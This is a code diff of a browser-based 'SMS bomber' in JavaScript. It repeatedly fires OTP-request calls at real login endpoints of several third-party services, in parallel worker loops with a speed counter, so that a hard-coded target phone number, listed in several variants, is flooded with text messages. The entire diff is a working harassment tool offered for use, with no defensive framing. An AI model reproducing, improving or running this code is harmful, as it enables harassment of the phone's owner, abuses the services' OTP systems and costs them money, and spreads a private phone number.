@@ -1,7 +1,7 @@
 // ===== CONFIG =====
 const REQUESTS = [
     {
-        name: "Pansho OTP Login",
+        name: "Pansho OTP",
         url: "https://pansho.com/customer/auth/login",
         method: "POST",
         headers: {"Content-Type": "application/x-www-form-urlencoded"},
@@ -13,7 +13,11 @@ const REQUESTS = [
         url: "https://apitxt.com/api/auth/login/request-otp",
         method: "POST",
         headers: {"Accept": "application/json", "Content-Type": "application/json"},
-        body: (phone) => JSON.stringify({country_code: "91", mobile_no: phone.replace('+91','').replace('91',''), channel: "sms"}),
+        body: (phone) => JSON.stringify({
+            country_code: "91",
+            mobile_no: phone.replace('+91','').replace('91',''),
+            channel: "sms"
+        }),
         phones: ["9729480795", "919729480795", "09729480795"]
     },
     {
@@ -21,54 +25,68 @@ const REQUESTS = [
         url: "https://api.testbook.com/api/v2/otp/send?emailOrMobile={phone}&resend=true",
         method: "POST",
         headers: {"Accept": "application/json", "Content-Type": "application/json", "X-Tb-Client": "web,1.3"},
-        body: (phone) => JSON.stringify({}),
+        body: () => JSON.stringify({}),
         phones: ["9729480795", "+919729480795", "919729480795"]
     }
 ];
 
 // ===== STATE =====
 let running = false;
+let stopRequested = false;
 let stats = { total: 0, success: 0, failed: 0 };
-let threads = [];
-let stopFlag = false;
+let startTime = 0;
+let reqCounter = 0;
+let speedInterval = null;
 
-// ===== DOM =====
-const logBox = document.getElementById('logBox');
-const totalCount = document.getElementById('totalCount');
-const successCount = document.getElementById('successCount');
-const failedCount = document.getElementById('failedCount');
-const statusDot = document.getElementById('statusDot');
-const statusText = document.getElementById('statusText');
-const startBtn = document.getElementById('startBtn');
-const stopBtn = document.getElementById('stopBtn');
-const targetPhone = document.getElementById('targetPhone');
+// ===== DOM REFS =====
+const $ = id => document.getElementById(id);
+const totalCount = $('totalCount');
+const successCount = $('successCount');
+const failedCount = $('failedCount');
+const statusDot = $('statusDot');
+const statusText = $('statusText');
+const speedDisplay = $('speedDisplay');
+const logBox = $('logBox');
+const startBtn = $('startBtn');
+const stopBtn = $('stopBtn');
+const targetPhone = $('targetPhone');
 
-function addLog(msg) {
+// ===== LOGGING =====
+function addLog(msg, type = 'info') {
     const entry = document.createElement('div');
     entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    entry.className = `log-${type}`;
     logBox.prepend(entry);
-    if (logBox.children.length > 50) logBox.removeChild(logBox.lastChild);
+    if (logBox.children.length > 100) logBox.removeChild(logBox.lastChild);
 }
 
+// ===== STATS UPDATE =====
 function updateStats() {
     totalCount.textContent = stats.total;
     successCount.textContent = stats.success;
     failedCount.textContent = stats.failed;
 }
 
-function updateStatus(runningState) {
-    if (runningState) {
+function updateStatus(state) {
+    if (state === 'running') {
         statusDot.className = 'status-dot running';
         statusText.textContent = 'Running';
         statusText.style.color = '#00cc44';
         startBtn.style.display = 'none';
         stopBtn.style.display = 'block';
+        startBtn.disabled = true;
     } else {
         statusDot.className = 'status-dot stopped';
         statusText.textContent = 'Stopped';
-        statusText.style.color = '#888';
+        statusText.style.color = '#1a1a2e';
         startBtn.style.display = 'block';
         stopBtn.style.display = 'none';
+        startBtn.disabled = false;
+        if (speedInterval) {
+            clearInterval(speedInterval);
+            speedInterval = null;
+            speedDisplay.textContent = '0 req/sec';
+        }
     }
 }
 
@@ -85,75 +103,95 @@ async function sendRequest(req, phone) {
         const resp = await fetch(url, {
             method: req.method,
             headers: headers,
-            body: body
+            body: body,
+            cache: 'no-cache'
         });
         
         return resp.status;
-    } catch {
+    } catch (e) {
         return 0;
     }
 }
 
-// ===== BOMBING WORKER =====
-async function worker(req, phone) {
-    while (!stopFlag) {
-        const phoneVariants = req.phones || [phone];
-        const targetPhone = phoneVariants[Math.floor(Math.random() * phoneVariants.length)];
+// ===== WORKER LOOP =====
+async function workerLoop(req, phone) {
+    while (!stopRequested && running) {
+        const variants = req.phones || [phone];
+        const targetPhone = variants[Math.floor(Math.random() * variants.length)];
         const status = await sendRequest(req, targetPhone);
         
         stats.total++;
+        reqCounter++;
         if (status === 200 || status === 302 || status === 201 || status === 202) {
             stats.success++;
-            addLog(`✅ ${req.name} | ${targetPhone} | ${status}`);
+            addLog(`✅ ${req.name} | ${targetPhone} | ${status}`, 'success');
         } else {
             stats.failed++;
-            addLog(`❌ ${req.name} | ${targetPhone} | ${status}`);
+            addLog(`❌ ${req.name} | ${targetPhone} | ${status}`, 'fail');
         }
         updateStats();
+        
+        // Small delay to avoid hammering
+        await new Promise(r => setTimeout(r, 50));
     }
 }
 
-// ===== START =====
+// ===== START BOMBING =====
 async function startBomb() {
     const phone = targetPhone.value.trim();
     if (!phone) {
-        alert('Enter phone number!');
+        alert('📱 Enter a phone number!');
         return;
     }
-    
     if (running) return;
     
     // Reset
-    stopFlag = false;
-    stats = { total: 0, success: 0, failed: 0 };
-    updateStats();
-    updateStatus(true);
-    addLog(`🚀 Bombing started on ${phone}`);
-    
+    stopRequested = false;
     running = true;
-    threads = [];
+    stats = { total: 0, success: 0, failed: 0 };
+    reqCounter = 0;
+    startTime = Date.now();
+    updateStats();
+    updateStatus('running');
+    addLog(`🚀 Bombing started on ${phone}`, 'info');
     
-    // Start one thread per request type
-    for (const req of REQUESTS) {
-        const t = new Promise((resolve) => {
-            worker(req, phone).then(resolve);
-        });
-        threads.push(t);
-    }
+    // Speed tracker
+    if (speedInterval) clearInterval(speedInterval);
+    speedInterval = setInterval(() => {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const speed = elapsed > 0 ? Math.round(reqCounter / elapsed) : 0;
+        speedDisplay.textContent = `${speed} req/sec`;
+    }, 1000);
     
-    await Promise.all(threads);
+    // Run all request types in parallel
+    const workers = REQUESTS.map(req => workerLoop(req, phone));
+    await Promise.all(workers);
     
-    if (!stopFlag) {
+    // If not stopped by user, auto-stop
+    if (running && !stopRequested) {
         running = false;
-        updateStatus(false);
-        addLog(`⏹️ Bombing stopped automatically`);
+        updateStatus('stopped');
+        addLog(`⏹️ Bombing completed (all workers finished)`, 'info');
     }
 }
 
-// ===== STOP =====
+// ===== STOP BOMBING =====
 function stopBomb() {
-    stopFlag = true;
+    if (!running) return;
+    stopRequested = true;
     running = false;
-    updateStatus(false);
-    addLog(`⏹️ Stopped by user`);
+    updateStatus('stopped');
+    addLog(`⏹️ Stopped by user`, 'info');
+    if (speedInterval) {
+        clearInterval(speedInterval);
+        speedInterval = null;
+        speedDisplay.textContent = '0 req/sec';
+    }
 }
+
+// ===== KEYBOARD SHORTCUT: Enter to start =====
+targetPhone.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && !startBtn.disabled) {
+        startBomb();
+    }
+});
